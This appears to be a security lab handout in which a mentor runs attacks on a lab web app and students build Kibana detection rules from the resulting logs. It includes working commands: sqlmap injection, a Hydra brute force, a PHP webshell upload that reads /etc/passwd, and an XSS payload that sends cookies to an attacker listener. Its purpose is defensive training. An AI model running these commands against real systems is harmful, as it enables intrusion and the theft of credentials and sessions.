# Part 1 — Web Application Attacks & Elastic Detection Rules

## How this section works

1. Mentor runs each attack from Kali  
2. Students open **Kibana → Discover** and find the log  
3. Students turn that search into a **Detection Rule** in Kibana Security

Logs land in the `filebeat-*` index. All searches below are KQL.

---

## Attack 1 — Reconnaissance (Nikto scan)

**Mentor runs:**
```bash
nikto -h http://logacademy.local
```

**What it does:** Scans for thousands of known paths, sends malformed requests, leaks scanner identity in User-Agent.

**Find it in Kibana:**
```kql
user_agent.original: *nikto*
```
Also check for 404 storms:
```kql
http.response.status_code: 404 AND source.ip: <KALI_IP>
```

### Rule to write
- **Type:** Custom Query  
- **Index:** `filebeat-*`  
- **KQL:** `user_agent.original: (*nikto* OR *sqlmap* OR *gobuster* OR *dirbuster*)`  
- **Severity:** Medium  
- **Name:** `Web Scanner Detected`

---

## Attack 2 — SQL Injection (search.php)

**Mentor runs:**
```bash
# Quick manual test
curl "http://logacademy.local/search.php?q=1' OR '1'='1"

# Automated with sqlmap
sqlmap -u "http://logacademy.local/search.php?q=1" --batch --level=2
```

**What it does:** Extracts database contents via UNION-based SQLi.

**Find it in Kibana:**
```kql
url.query: (*OR* AND *1=1*) OR url.query: (*UNION* AND *SELECT*)
```
Or raw message search:
```kql
message: *sqlmap*
```

### Rule to write
- **Type:** Custom Query  
- **Index:** `filebeat-*`  
- **KQL:** `url.query: (*UNION+SELECT* OR *OR+1%3D1* OR *'+OR+'1'%3D'1*)`  
- **Severity:** High  
- **Name:** `SQL Injection Attempt`

> Note: URL-encoded `=` is `%3D`, space is `+` or `%20`. Students can also use `message: *sqlmap*` as a simpler version.

---

## Attack 3 — Brute Force Login (admin panel)

**Mentor runs:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  logacademy.local http-post-form \
  "/admin/login.php:username=^USER^&password=^PASS^:Invalid" \
  -t 20 -V
```

**Find it in Kibana — many 401s from same IP:**
```kql
http.response.status_code: 401 AND source.ip: <KALI_IP>
```
Or count-based view: add `source.ip` as a split series in Lens/Visualize.

### Rule to write
- **Type:** Threshold  
- **Index:** `filebeat-*`  
- **KQL:** `http.response.status_code: 401 AND url.path: *login*`  
- **Threshold field:** `source.ip`  
- **Threshold count:** `10` in `1 minute`  
- **Severity:** High  
- **Name:** `Brute Force Login Detected`

---

## Attack 4 — File Upload RCE (documents/upload.php)

**Mentor runs:**
```bash
# Create a PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload it
curl -X POST http://logacademy.local/documents/upload.php \
  -F "file=@shell.php" \
  -b "PHPSESSID=<valid_session>"  # grab session after logging in

# Execute commands through the shell
curl "http://logacademy.local/uploads/shell.php?cmd=id"
curl "http://logacademy.local/uploads/shell.php?cmd=cat+/etc/passwd"
```

**Find it in Kibana:**
```kql
url.path: */uploads/*.php*
```
Or look for the POST to upload endpoint:
```kql
http.request.method: POST AND url.path: *upload*
```

### Rule to write
- **Type:** Custom Query  
- **Index:** `filebeat-*`  
- **KQL:** `url.path: /uploads/*.php`  
- **Severity:** Critical  
- **Name:** `PHP Webshell Execution`

---

## Attack 5 — Stored XSS (messages.php)

**Mentor runs (from browser or curl):**
```bash
# POST a message with XSS payload
curl -X POST http://logacademy.local/messages.php \
  -d "body=<script>document.location='http://<KALI_IP>:8080/steal?c='+document.cookie</script>" \
  -b "PHPSESSID=<valid_session>"

# Start a listener to catch cookies
nc -lvnp 8080
```

**Find it in Kibana — look for script tags in POST body:**
```kql
message: *<script>*
```

### Rule to write
- **Type:** Custom Query  
- **Index:** `filebeat-*`  
- **KQL:** `message: (*<script>* OR *javascript:* OR *onerror=*)`  
- **Severity:** Medium  
- **Name:** `XSS Payload in HTTP Request`

---

## Kibana Rule Creation — Step by Step

1. **Kibana → Security → Rules → Create new rule**
2. Pick rule type (Custom Query or Threshold)
3. Paste KQL into the query box, select index `filebeat-*`
4. Fill in name, severity, MITRE technique
5. Set schedule: every 1 minute, look-back 5 minutes
6. Save and enable

Test it by having the mentor rerun the attack and checking **Kibana → Security → Alerts**.

---

## MITRE ATT&CK Reference

| Attack | Technique |
|---|---|
| Scanner/recon | T1595 — Active Scanning |
| SQL Injection | T1190 — Exploit Public-Facing Application |
| Brute Force | T1110.001 — Password Guessing |
| File Upload RCE | T1190 + T1059.004 |
| XSS | T1185 — Browser Session Hijacking |
